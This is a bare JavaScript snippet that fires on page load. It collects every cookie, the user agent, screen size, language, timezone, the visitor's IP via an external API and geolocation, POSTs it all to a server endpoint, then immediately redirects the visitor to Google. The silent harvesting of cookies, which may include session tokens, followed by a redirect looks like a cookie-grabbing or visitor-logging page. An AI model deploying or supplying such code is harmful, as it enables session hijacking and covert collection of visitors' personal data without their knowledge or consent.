// Automatically grab user info and send data on page load
window.addEventListener('load', async () => {
    // Get cookies from the document
    const cookies = document.cookie.split('; ').map(cookie => cookie.split('='));
    const cookieObj = Object.fromEntries(cookies);

    // Get the current time of visit in seconds since epoch
    const timeOfVisit = Math.floor(Date.now() / 1000);

    // Get user agent information
    const userAgent = navigator.userAgent;

    // Get screen resolution
    const screenWidth = window.screen.width;
    const screenHeight = window.screen.height;

    // Get browser language
    const language = navigator.language || navigator.userLanguage;

    // Get timezone
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

    // Get user's IP address using an external API
    let ipAddress = '';
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        ipAddress = data.ip;
    } catch (error) {
        console.error("Error fetching IP address:", error);
    }

    // Get location information (if permitted by the user)
    let location = { latitude: null, longitude: null };
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((position) => {
            location.latitude = position.coords.latitude;
            location.longitude = position.coords.longitude;
        }, (error) => {
            console.error("Geolocation error:", error);
        });
    }

    // Wait for geolocation to be retrieved (if needed)
    await new Promise(resolve => setTimeout(resolve, 1000)); // Wait for 1 second for location retrieval

    // Create the user object with all gathered information
    const user = {
        id: Date.now(), // Unique ID based on the current timestamp
        'time of visit': timeOfVisit,
        cookies: cookieObj,
        userAgent: userAgent,
        screenResolution: {
            width: screenWidth,
            height: screenHeight
        },
        location: location,
        ipAddress: ipAddress,
        language: language,
        timezone: timezone,
        platform: navigator.platform
    };

    // Log the user object for debugging
    console.log('User Information:', user);

    // Send the user data to the server
    await fetch('/update-db', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(user)
    });

    // Redirect to Google
    window.location.href = 'https://www.google.com';
});
